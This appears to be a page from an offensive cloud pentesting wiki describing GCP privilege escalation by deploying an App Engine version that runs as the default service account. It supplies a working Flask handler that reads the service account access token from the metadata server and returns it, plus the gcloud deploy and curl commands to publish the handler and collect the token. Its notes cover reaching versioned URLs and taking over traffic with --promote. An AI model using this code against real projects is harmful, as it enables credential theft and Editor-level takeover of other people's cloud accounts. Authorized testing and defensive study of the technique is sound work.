---
title: "App Engine: deploy a version as the App Engine service account"
description: "Deploying an App Engine version with appengine deploy permissions, running code as the App Engine default service account."
keywords:
  - App Engine
  - appengine deploy
  - default service account
  - version
  - actAs
  - code execution
---

# App Engine

App Engine standard and flexible versions run as the App Engine default service account (`<project>@appspot.gserviceaccount.com`), which holds Editor by default. With the App Engine deploy permissions (`appengine.applications.update` / `appengine.versions.create` and `cloudbuild`/storage to stage), you ship a version whose handler reads and returns the service account token.

## Deploy a token-leaking app

```python
# main.py (Flask)
import requests
from flask import Flask
app = Flask(__name__)
@app.route("/")
def pwn():
    return requests.get(
      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
      headers={"Metadata-Flavor": "Google"}).text
```

```bash
gcloud app deploy app.yaml --quiet
curl "https://<project>.appspot.com/"
```

## Exploitation notes

- The default App Engine account is Editor, so a deploy is effectively Editor code execution; chain to a token-yielding resource for anything beyond Editor.
- Deploying a new version does not route traffic until promoted, but you can hit the versioned URL directly, or `--promote` to take over the default.
- App Engine deploys stage through Cloud Build and a staging bucket, so the deploy permissions pull in those services.

## Tools

- **gcloud** (`app deploy`): the deploy.

## References

- [Rhino Security Labs: GCP privilege escalation (part 2)](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-2/)
- [Hacking the Cloud: GCP](https://hackingthe.cloud/)
- [Google: App Engine service account](https://cloud.google.com/appengine/docs/standard/python3/service-account)
